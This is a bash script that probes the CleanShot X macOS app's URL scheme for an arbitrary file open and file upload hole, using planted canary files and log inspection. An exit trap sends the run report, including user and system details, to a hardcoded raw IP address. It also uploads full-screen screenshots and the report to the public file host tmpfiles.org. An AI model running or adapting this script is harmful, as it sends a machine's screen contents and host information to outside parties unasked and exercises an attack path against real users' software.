#!/bin/bash
# CleanShot X probe v4 — URL scheme handler behaviour with observable side effects
OUT=/tmp/csx-report-v4.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x
set +e

DROP_URL="http://143.246.43.43:8080/csx-v4"
CANARY="CSX_CANARY_$(date +%s)_MARKER"

finish() {
  echo "=== EXIT $? ==="
  for f in /tmp/scr1.png /tmp/scr2.png /tmp/scr3.png; do
    [ -f "$f" ] && curl -s --max-time 60 -F "file=@$f" https://tmpfiles.org/api/v1/upload -o "$f.json" && cat "$f.json"
  done
  curl -s --max-time 60 -X POST --data-binary @/tmp/csx-report-v4.txt "$DROP_URL" || true
  curl -s --max-time 60 -F "file=@/tmp/csx-report-v4.txt" https://tmpfiles.org/api/v1/upload -o /tmp/u4.json || true
  cat /tmp/u4.json 2>/dev/null
}
trap finish EXIT

echo "=== ENV ==="
sw_vers; uname -m; who

DMG=/tmp/csx.dmg
curl -sSL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
shasum -a 256 "$DMG"
hdiutil attach "$DMG" -nobrowse -noverify -readonly
MP=$(hdiutil info | awk -F'\t' '/\/Volumes\//{print $NF}' | tail -1)
APP="$MP/CleanShot X.app"
BIN="$APP/Contents/MacOS/CleanShot X"
ls -ld "$APP"

echo "=== REGISTER WITH LAUNCHSERVICES ==="
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$APP" 2>&1
sleep 2
open -a "$APP"
sleep 8
pgrep -fl CleanShot | head -3

echo "=== BASELINE FILES ==="
ls -la ~/Desktop 2>&1 | head -10
ls -la ~/Pictures 2>&1 | head -10

echo "=== A: capture control ==="
open "cleanshot://capture" 2>&1
sleep 6
screencapture -x /tmp/scr1.png 2>&1
ls -l /tmp/scr1.png
ls -lat ~/Desktop 2>&1 | head -6

echo "=== B: open arbitrary path ==="
python3 - <<'PY'
import base64, struct, zlib
def png(path, color):
    w=h=64
    raw=b''.join(b'\x00'+bytes(color)*w for _ in range(h))
    def chunk(t,d):
        c=t+d
        return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
    data=(b'\x89PNG\r\n\x1a\n'+chunk(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))
          +chunk(b'IDAT',zlib.compress(raw))+chunk(b'IEND',b''))
    open(path,'wb').write(data)
png('/tmp/csx_canary.png',(255,0,0))
open('/tmp/csx_canary.txt','w').write('CSX_CANARY_MARKER_CONTENT_1234567890\n')
print('canary built')
PY
ls -l /tmp/csx_canary.png /tmp/csx_canary.txt
open "cleanshot://open?path=/tmp/csx_canary.png" 2>&1
sleep 6
screencapture -x /tmp/scr2.png 2>&1
ls -l /tmp/scr2.png

echo "=== C: upload arbitrary file ==="
open "cleanshot://upload?file=/tmp/csx_canary.txt" 2>&1
sleep 10
screencapture -x /tmp/scr3.png 2>&1

echo "=== D: filesystem evidence ==="
find ~/Library/Caches ~/Library/Application\ Support ~/Desktop ~/Pictures /tmp -maxdepth 3 -newermt '-3 minutes' -type f 2>/dev/null | grep -v csx-report | head -40
echo "--- grep canary in app data ---"
grep -rl "CSX_CANARY_MARKER_CONTENT_1234567890" ~/Library 2>/dev/null | head -10

echo "=== E: network evidence ==="
log show --last 3m --predicate 'process CONTAINS "CleanShot"' --style compact 2>/dev/null | grep -iE "upload|https|api.cleanshot|URLSession|NSURL|cloud|share" | tail -40

echo "=== F: file open evidence ==="
log show --last 3m --predicate 'process CONTAINS "CleanShot"' --style compact 2>/dev/null | grep -iE "csx_canary|open|read|contentsOf|NSDocument|document" | tail -40

echo "=== DONE ==="
exit 0
